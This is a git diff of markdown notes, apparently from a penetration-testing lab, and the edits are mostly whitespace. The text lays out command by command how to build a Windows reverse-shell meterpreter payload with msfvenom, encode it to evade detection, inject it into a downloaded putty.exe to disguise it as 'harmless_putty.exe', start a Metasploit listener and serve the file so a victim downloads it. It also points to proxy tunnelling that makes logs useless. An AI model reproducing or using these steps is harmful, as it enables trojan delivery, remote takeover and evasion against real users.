@@ -43,18 +43,22 @@ HTTPort is a tool that bypasses restrictive HTTP proxies. It tunnels blocked tra
 > This method is reliable and features strong encryption, making proxy logs useless.
 [HTTPort, secure TCP through HTTP tunneling](https://www.targeted.org/htthost/)
 
-**Steps**:
-You generated a basic, easily detectable payload:
+**Steps**:    
+You generated a basic, easily detectable payload:    
 - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.111.208 LPORT=4444 -f exe -o payload.exe`
-Generate a New, Encoded Payload:
+
+Generate a New, Encoded Payload:    
 - `msfvenom -p windows/shell_reverse_tcp LHOST=172.16.111.208 LPORT=4445 -x template.exe -k -e x86/shikata_ga_nai -i 5 -f exe -o basic_shell.exe`
-You downloaded putty.exe to use as a legitimate template:
-- `wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe -O template.exe`
-You injected your payload into that template to create a more evasive executable:
-- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.111.208 LPORT=4444 -x template.exe -k -f exe -o harmless_putty.exe`
+
+You downloaded putty.exe to use as a legitimate template:    
+- `wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe -O template.exe`    
+
+You injected your payload into that template to create a more evasive executable:    
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.111.208 LPORT=4444 -x template.exe -k -f exe -o harmless_putty.exe`    
+
 **Result**: Your final payload is saved as harmless_putty.exe.    
 
-Start the Listener on Your Kali Machine
+Start the Listener on Your Kali Machine    
 - `msfconsole -q`
 - `use multi/handler`
 - `set payload windows/meterpreter/reverse_tcp`
@@ -62,7 +66,7 @@ Start the Listener on Your Kali Machine
 - `set LPORT 4444`
 - `exploit` or `exploit -j`
 
-Download harmless_putty
+Download harmless_putty:      
 - Open a new terminal and start a web server to host your harmless_putty.exe file so the victim can download it.
   - `cd ~`
   - `python3 -m http.server 80`
